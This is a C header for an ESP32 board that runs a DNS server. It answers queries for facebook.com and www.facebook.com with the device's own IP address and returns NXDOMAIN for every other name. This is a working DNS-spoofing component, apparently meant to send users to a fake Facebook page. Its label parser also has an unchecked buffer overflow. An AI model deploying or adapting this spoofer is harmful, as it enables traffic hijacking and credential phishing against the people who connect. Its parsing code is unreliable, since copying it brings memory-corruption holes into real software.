#ifndef DNS_H
#define DNS_H

#define DNS_PORT 53
#define ESP32_IP "192.168.10.1"

void dns_server_task(void *pvParameters) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock < 0) {
        ESP_LOGE("DNSServer", "Failed to create socket");
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in server_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(DNS_PORT),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };

    if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        ESP_LOGE("DNSServer", "Failed to bind socket");
        close(sock);
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI("DNSServer", "DNS server started on port %d", DNS_PORT);
    uint8_t buffer[512];

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);
        int len = recvfrom(sock, buffer, sizeof(buffer), 0,
                           (struct sockaddr *)&client_addr, &addr_len);
        if (len <= 0) continue;

        // Parse question domain
        char domain[256] = {0};
        int pos = 12;  // Start of question section
        int i = 0;
        while (pos < len && buffer[pos] != 0) {
            uint8_t label_len = buffer[pos++];
            for (int j = 0; j < label_len && pos < len; j++) {
                domain[i++] = buffer[pos++];
            }
            domain[i++] = '.';
        }
        domain[i - 1] = '\0';  // Null-terminate

        ESP_LOGI("DNSServer", "Received DNS query for: %s", domain);

        bool is_target = (
            strcmp(domain, "facebook.com") == 0 ||
            strcmp(domain, "www.facebook.com") == 0
        );

        if (is_target) {
            // Build response: basic A record with ESP32 IP
            buffer[2] |= 0x80; // Set response flag
            buffer[3] = 0x80;  // Recursion Available, No Error
            buffer[7] = 0x01;  // ANCOUNT = 1

            int qlen = pos + 5;  // Skip null byte and QTYPE + QCLASS
            int rpos = qlen;

            // Copy name as pointer to offset 0xC
            buffer[rpos++] = 0xC0;
            buffer[rpos++] = 0x0C;

            buffer[rpos++] = 0x00; buffer[rpos++] = 0x01;  // TYPE A
            buffer[rpos++] = 0x00; buffer[rpos++] = 0x01;  // CLASS IN
            buffer[rpos++] = 0x00; buffer[rpos++] = 0x00; buffer[rpos++] = 0x00; buffer[rpos++] = 0x3C; // TTL
            buffer[rpos++] = 0x00; buffer[rpos++] = 0x04;  // RDLENGTH

            struct in_addr ip;
            inet_aton(ESP32_IP, &ip);
            memcpy(&buffer[rpos], &ip.s_addr, 4);
            rpos += 4;

            sendto(sock, buffer, rpos, 0, (struct sockaddr *)&client_addr, addr_len);
        } else {
            // NXDOMAIN: response with no answers
            buffer[2] |= 0x80;
            buffer[3] = 0x83;  // Flags: RA, RCODE=3 (NXDOMAIN)
            buffer[7] = 0x00;  // ANCOUNT = 0

            sendto(sock, buffer, len, 0, (struct sockaddr *)&client_addr, addr_len);
        }
    }

    close(sock);
    vTaskDelete(NULL);
}
#endif // DNS_H